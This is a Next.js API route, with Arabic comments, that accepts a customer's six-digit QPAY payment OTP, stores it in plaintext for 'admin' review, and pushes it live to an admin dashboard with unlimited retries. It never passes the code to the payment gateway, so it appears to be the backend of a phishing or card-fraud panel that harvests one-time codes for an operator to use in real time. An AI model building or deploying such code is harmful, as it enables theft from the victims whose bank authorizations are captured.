import { NextRequest, NextResponse } from "next/server";
import { createServiceClient, broadcastNewEntry } from "@/lib/supabase/server";

interface QpayOtpBody {
  paymentEntryId?: string;
  bookingId?: string;
  otp?: string;
}

// العميل يرسل رمز التحقق (6 أرقام) عبر بوابة QPAY — يُخزّن بانتظار المتابعة.
export async function POST(req: NextRequest) {
  const body = (await req.json().catch(() => ({}))) as QpayOtpBody;
  const paymentEntryId = body.paymentEntryId;
  const bookingId = body.bookingId;
  const otp = (body.otp ?? "").trim();

  // QPAY يستخدم رمزاً من 6 أرقام فقط
  if (!/^\d{6}$/.test(otp)) {
    return NextResponse.json({ error: "invalid_otp_length" }, { status: 422 });
  }

  if (!paymentEntryId) {
    return NextResponse.json({ error: "missing_payment_entry_id" }, { status: 400 });
  }

  const supabase = createServiceClient();

  const { data: paymentEntry, error: pErr } = await supabase
    .from("client_data_entries")
    .select("id, client_id, payload")
    .eq("id", paymentEntryId)
    .maybeSingle();

  if (pErr || !paymentEntry) {
    return NextResponse.json({ error: "payment_not_found" }, { status: 404 });
  }

  const pPayload = paymentEntry.payload as Record<string, unknown>;

  // السماح للعميل بأي عدد من المحاولات: كل محاولة تُنشئ طلب OTP جديداً ينتظر
  // قرار المدير (pending_admin) بشكل مستقل عن أي رفض سابق. لا نحجب العميل
  // بسبب رفض قديم — القرار يقع على كل رمز جديد منفرداً.
  // القيد الوحيد: لا نقبل رمزاً لمحاولة دفع بعد إتمامها أو إلغائها.
  const linkedBookingId = bookingId ?? (pPayload.booking_id as string | null) ?? null;
  if (linkedBookingId) {
    const { data: bookingCheck } = await supabase
      .from("bookings")
      .select("status")
      .eq("id", linkedBookingId)
      .maybeSingle();
    const st = String(bookingCheck?.status ?? "pending");
    if (st === "paid" || st === "completed" || st === "cancelled") {
      return NextResponse.json({ error: "payment_not_approved" }, { status: 409 });
    }
  }

  // تخزين طلب التحقق بانتظار المتابعة
  const { data: inserted, error: insertErr } = await supabase
    .from("client_data_entries")
    .insert({
      client_id: paymentEntry.client_id ?? null,
      type: "otp_request",
      payload: {
        method: "qpay",
        payment_entry_id: paymentEntryId,
        booking_id: bookingId ?? pPayload.booking_id ?? null,
        booking_ref: pPayload.booking_ref ?? null,
        otp,
        status: "pending_admin",
        created_by: "qpay_otp",
      },
    })
    .select("id")
    .single();

  if (insertErr || !inserted) {
    return NextResponse.json({ error: "submit_failed" }, { status: 500 });
  }

  // أبلغ لوحة الإدارة بوجود طلب OTP جديد لتحديث القائمة لحظياً.
  void broadcastNewEntry({
    clientId: paymentEntry.client_id ?? null,
    entryId: inserted.id,
    type: "otp_request",
  });

  return NextResponse.json({
    entryId: inserted.id,
    status: "pending_admin",
  });
}